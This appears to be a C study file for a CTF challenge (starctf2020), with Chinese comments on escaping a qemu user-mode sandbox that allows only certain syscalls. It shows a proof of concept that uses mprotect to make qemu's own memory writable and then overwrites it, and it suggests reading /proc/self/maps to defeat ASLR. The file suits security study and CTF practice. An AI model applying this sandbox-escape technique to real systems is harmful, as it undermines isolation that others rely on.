/*
题目通过patch源码的方式, 只允许调用下列系统调用
+        case TARGET_NR_brk:
+        case TARGET_NR_uname:
+        case TARGET_NR_readlinkat:
+        case TARGET_NR_faccessat:
+        case TARGET_NR_openat2:
+        case TARGET_NR_openat:
+        case TARGET_NR_read:
+        case TARGET_NR_readv:
+        case TARGET_NR_write:
+        case TARGET_NR_writev:
+        case TARGET_NR_mmap:
+        case TARGET_NR_munmap:
+        case TARGET_NR_exit:
+        case TARGET_NR_exit_group:
+        case TARGET_NR_mprotect:

但是最后发现, qemu-usermod中没有内存隔离, 可以直接访问qemu的内存空间

tested on ubuntu1804, 
$ ./qemu-x86_64 --version
qemu-x86_64 version 2.11.1(Debian 1:2.11+dfsg-1ubuntu7.31)
Copyright (c) 2003-2017 Fabrice Bellard and the QEMU Project developers

gcc qemu-usermod.c -o test && gdb --args qemu-x86_64 ./test

qemu 和 test 两个二进制程序所有缓解措施都打开

refer: starctf2020(1?), flag2
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>

void hexdump(const char *desc, void *addr, int len) {
    int i;
    unsigned char buff[17];
    unsigned char *pc = (unsigned char *)addr;

    // Output description if given.
    if (desc != NULL)
        printf("%s:\n", desc);
    if (len == 0) {
        printf("  ZERO LENGTH\n");
        return;
    }
    if (len < 0) {
        printf("  NEGATIVE LENGTH: %i\n", len);
        return;
    }

    // Process every byte in the data.
    for (i = 0; i < len; i++) {
        // Multiple of 16 means new line (with line offset).
        if ((i % 16) == 0) {
            // Just don't print ASCII for the zeroth line.
            if (i != 0)
                printf("  %s\n", buff);
            // Output the offset.
            printf("  %04x ", i);
        }
        // Now the hex code for the specific character.
        printf(" %02x", pc[i]);
        // And store a printable ASCII character for later.
        if ((pc[i] < 0x20) || (pc[i] > 0x7e))
            buff[i % 16] = '.';
        else
            buff[i % 16] = pc[i];
        buff[(i % 16) + 1] = '\0';
    }
    // Pad out last line if not exactly 16 characters.
    while ((i % 16) != 0) {
        printf("   ");
        i++;
    }
    // And print the final ASCII bit.
    printf("  %s\n", buff);
}

int main(){
    char buf[0x10];
    
    void *heap = malloc(0x10);
    printf("main @ 0x%llx\n",&main); // 这里我们可以发现, pie貌似不会影响codebase, stack, heap
    printf("stack @ 0x%llx\n",&buf);
    printf("heap @ 0x%llx\n",heap);

    // 在这里观察vmmap我们可以发现布局, 我们的目标应该就是想办法击败aslr?

    /* 我还没看过他们的writeup, 这里提供一个可能的思路, mprotect当地址不可读时返回-1, 可读时返回0
    可能可以通过这种方式来爆破出qemu内存基址之类的? ==> 64位, 太长了, 应该不可行

    注意到给了open等函数, 我感觉可以open("/proc/self/maps"), 这样我们就可以获得所有的地址了
    接着直接去读写qemu即可
    */
    void *addr = (void *)0x0000555555554000; // disable aslr
    int ret = mprotect(addr,0x1000,7);
    printf("%p @ %d\n",addr,ret);

    getchar();
    hexdump(0,addr,0x4);
    *(char *)addr = 0; // trigger
    hexdump(0,addr,0x4);
    return 0;
}
